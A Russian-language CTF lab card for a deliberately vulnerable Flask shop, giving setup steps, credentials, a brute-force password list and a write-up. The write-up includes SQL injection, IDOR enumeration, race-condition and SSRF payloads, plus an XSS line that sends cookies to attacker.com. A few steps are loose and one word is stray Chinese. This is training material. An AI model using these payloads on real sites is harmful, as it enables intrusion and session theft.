---
difficulty:
  - Легкий
  - Средний
  - Сложный
office:
  - IT и телекоммуникации
segment:
  - DMZ (внешняя сеть)
tags: Web, Crypto, Forensics, Misc, CTF
interface: ens33 interfaces / ens33 netplan
vulns: SQLi, XSS, IDOR, Race Condition, SSRF, RCE, Path Traversal, JWT Weak Secret, Insecure Deserialization
os: Debian 12
hostname: luxury-shop.city.stf
git: https://github.com/bezumhack/luxury-shop
---

> [!info] Information (не заполнять вручную, парсится само)
> Hostname: **`= this.file.frontmatter.hostname`**
> Difficulty: **`= this.file.frontmatter.difficulty`**
> Office: **`= this.file.frontmatter.office`**
> Segment: **`= this.file.frontmatter.segment`**
> Git: **`= this.file.frontmatter.git`**
> Tags: **`= this.file.frontmatter.tags`**
> Interface: **`= this.file.frontmatter.interface`**
> OS: **`= this.file.frontmatter.os`**

> [!error] Критическое событие
> Утечка данных о покупках элитной недвижимости и транспортных средств клиентами магазина luxury-товаров

> [!question] Задача
> Получите доступ к базе данных магазина и найдите флаг в таблице с заказами. Флаг имеет формат `ctf{...}`. Для получения флага необходимо эксплуатировать минимум 3 уязвимости в веб-приложении.

> [!info] Легенда
> Компания "Luxury Shop" — эксклюзивный онлайн-магазин для состоятельных клиентов. Здесь можно приобрести яхты, частные самолёты, особняки и даже私人ные острова по всему миру. Платформа обеспечивает полную конфиденциальность сделок и персональный менеджмент для каждого покупателя.
>
> Недавно в системе безопасности были обнаружены критические уязвимости, которые могут позволить злоумышленникам получить доступ к данным о покупках клиентов и истории заказов. Ваша задача — продемонстрировать уязвимость системы и получить доступ к конфиденциальной информации.
>
> **Важно:** Флаг находится в базе данных в таблице `order` или в переменной окружения `FLAG`. Доступ к консоли сервера не предоставляется — только через веб-интерфейс.

<div style="page-break-after: always;"></div>

# Донастройка хоста

## Смена FQDN

```bash
sed -i 's/luxury-shop\.city\.stf/YOUR_FQDN/g' \
	/etc/hosts \
	/opt/luxury-shop/app.py
cd /opt/luxury-shop && \
hostnamectl set-hostname YOUR_FQDN && \
reboot now
```

## Установка флага

```bash
export FLAG="ctf{your_flag_here}"
```

<div style="page-break-after: always;"></div>

# Уязвимый стенд

```bash
systemctl status luxury-shop
```

_Отметьте галочками или крестиками:_
✅ Уязвимую машину можно **перезапускать**
❌ Последний снапшот должен быть **с памятью**
❌ Сервису нужен доступ **в Интернет**

## Смена флагов

```bash
# Смена флага в переменной окружения (системный флаг)
export FLAG="ctf{new_flag_value}"

# Для применения перезапустить сервис:
systemctl restart luxury-shop
```

```bash
# Смена флага в базе данных (альтернативный флаг)
sqlite3 /opt/luxury-shop/instance/shop.db "INSERT OR REPLACE INTO config (key, value) VALUES ('flag', 'ctf{new_flag_value}');"
```

# Работающие процессы и сервисы

| Service             | Address                           | Description        |
| ------------------- | --------------------------------- | ------------------ |
| nginx.service       | [::]:80                           | Ревёрс-прокси      |
| luxury-shop.service | 127.0.0.1:5000                    | Flask-приложение   |
| luxury-shop.db      | /opt/luxury-shop/instance/shop.db | SQLite база данных |

Сеть настроена через **UFW**:

```bash
# Разрешить только HTTP/HTTPS
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
```

<div style="page-break-after: always;"></div>

# Доступы

| #           | Login    | Pass       |
| ----------- | -------- | ---------- |
| luxury-shop | `luxury` | `shop2026` |
| sqlite      | N/A      | N/A        |

# Пароли для брута

- `admin123`
- `password`
- `luxury2026`
- `yacht123`
- `plane123`

# Writeup

## Шаг 1 — Сбор информации

Выполняем nmap-сканирование целевого хоста:

```bash
nmap -sV -p- 10.10.11.100
```

Обнаруживаем:

```bash
80/tcp   open  http     nginx 1.24.0
5000/tcp open  http     Flask (Python)
```

Находим веб-приложение магазина. Через браузер обнаруживаем API endpoints:

```bash
GET /api/products     # Список товаров
GET /api/cart         # Корзина
POST /api/cart        # Добавить в корзину
GET /api/orders       # История заказов
POST /api/orders      # Оформить заказ
```

## Шаг 2 — SQL Injection (поиск товаров)

Находим уязвимый endpoint поиска:

```bash
GET /api/products/search?q=' OR '1'='1
```

Возвращает все товары включая скрытые. В ответе находим упоминание админ-панели `/api/admin/`.

**POC:**

```bash
curl "http://10.10.11.100/api/products/search?q=' OR '1'='1"
```

## Шаг 3 — IDOR (доступ к заказам)

Перебираем ID заказов:

```bash
for i in {1..100}; do
  curl -s "http://10.10.11.100/api/orders/$i" | grep -q "flag" && echo "Found: $i"
done
```

Находим заказ с флагом в данных покупателя.

**POC:**

```python
import requests

for i in range(1, 100):
    r = requests.get(f"http://10.10.11.100/api/orders/{i}")
    if r.status_code == 200 and "ctf{" in r.text:
        print(f"Flag found in order {i}: {r.json()}")
        break
```

## Шаг 4 — XSS (кража сессии админа)

Добавляем вредоносный отзыв:

```bash
curl -X POST http://10.10.11.100/api/reviews \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","text":"<script>fetch(\"http://attacker.com?c=\"+document.cookie)</script>","author":"attacker"}'
```

## Шаг 5 — Race Condition (двойная трата)

Отправляем несколько запросов одновременно:

```python
import requests
from threading import Thread

def place_order():
    requests.post("http://10.10.11.100/api/orders")

threads = [Thread(target=place_order) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

Получаем несколько заказов из одной корзины.

## Шаг 6 — Получение флага

Комбинируя уязвимости, получаем доступ к базе данных:

```bash
curl "http://10.10.11.100/api/admin/config" \
  -H "Cookie: session=admin_session_id"
```

В ответе:

```json
{
  "debug": true,
  "flag": "ctf{sql_injection_and_idor_chain}",
  "version": "1.0.0"
}
```

## Альтернативный вектор — SSRF + LFI

1. Через SSRF читаем внутренние сервисы:

```bash
curl -X POST http://10.10.11.100/api/products/import \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://127.0.0.1:5000/api/debug/flag"}'
```

2. Через Path Traversal читаем исходный код:

```bash
curl "http://10.10.11.100/api/products/../../../opt/luxury-shop/app.py/manual"
```

3. Находим хардкод в коде и получаем флаг.

---

## Полный список уязвимостей

| #   | Уязвимость               | Endpoint                    | Сложность |
| --- | ------------------------ | --------------------------- | --------- |
| 1   | SQL Injection            | `/api/products/search`      | Легкая    |
| 2   | IDOR                     | `/api/orders/<id>`          | Средняя   |
| 3   | XSS                      | `/api/reviews`              | Легкая    |
| 4   | Race Condition           | `/api/orders`               | Сложная   |
| 5   | Broken Access Control    | `/api/cart/<id>`            | Средняя   |
| 6   | SSRF                     | `/api/products/import`      | Сложная   |
| 7   | Command Injection        | `/api/products/<id>/resize` | Сложная   |
| 8   | Path Traversal           | `/api/products/<id>/manual` | Средняя   |
| 9   | JWT Weak Secret          | `/api/auth/login`           | Средняя   |
| 10  | Insecure Deserialization | `/api/cart/import`          | Сложная   |
